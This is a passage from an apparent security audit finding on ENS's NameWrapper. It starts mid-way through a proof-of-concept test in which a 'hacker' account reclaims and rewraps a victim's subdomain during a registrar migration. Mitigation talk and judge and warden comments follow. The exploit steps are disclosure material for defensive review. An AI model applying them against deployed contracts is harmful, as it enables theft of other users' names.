[H-01]//// XXX: corrently, `sub1.eth` becomes a normal nodeawaitEnsRegistryH.setOwner(wrappedTokenId1,NameWrapper.address)// create `sub2.sub1.eth` to the victim user with `PARENT_CANNOT_CONTROL`// burnt.awaitNameWrapperH.setSubnodeOwner(wrappedTokenId1,label2,account2,PARENT_CANNOT_CONTROL|CANNOT_UNWRAP,MAX_EXPIRY)expect(awaitNameWrapper.ownerOf(wrappedTokenId2)).to.equal(account2)// XXX: reclaim the `EnsRegistry.owner` of `sub1.eth` as the hackerawaitBaseRegistrarH.reclaim(labelHash1,hacker)expect(awaitEnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)expect(awaitBaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)// reset the `EnsRegistry.owner` of `sub2.sub1.eth` as the hackerawaitEnsRegistryH.setSubnodeOwner(wrappedTokenId1,labelHash2,hacker)expect(awaitEnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)// wrap `sub2.sub1.eth` to re-claim as the ownerawaitEnsRegistryH.setApprovalForAll(NameWrapper.address,true)awaitNameWrapperH.wrap(encodeName('sub2.sub1.eth'),hacker,EMPTY_ADDRESS)expect(awaitNameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)})
Recommended Mitigation Steps
May need to discuss with ENS team. A naive patch is to check whther a given ETH2LD node is indeed wrapped every time we operate it. However, it is not gas-friendly.
jefflau (ENS) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how, because of the migration period, with two controller registrar being active at the same time, a malicious attacker could claim sub-nodes that belong to other people.In contrast to an external requirement that is vague, the Sponsor has made it clear that a similar setup will happen in reality, and because of the impact, I agree with a High Severity.It may be worth exploring a “Migration Registry”, which maps out which name was migrated, while allowing migration to move only in one way.
izhuer (warden) commented:
The correspondingpatchlooks valid.I was trying to find a more gas-efficient (w/o tricky code) mitigation patch but did not get lucky yet. I will let Sponsor know here if I figure it out.
csanuragjain (warden) commented:
Looks good to me.For expired node, if registrar owner is not NameWrapper then owner is nullified and becomes address(0)if(registrarExpiry > block.timestamp &&registrar.ownerOf(uint256(labelHash)) != address(this)) {owner = address(0);}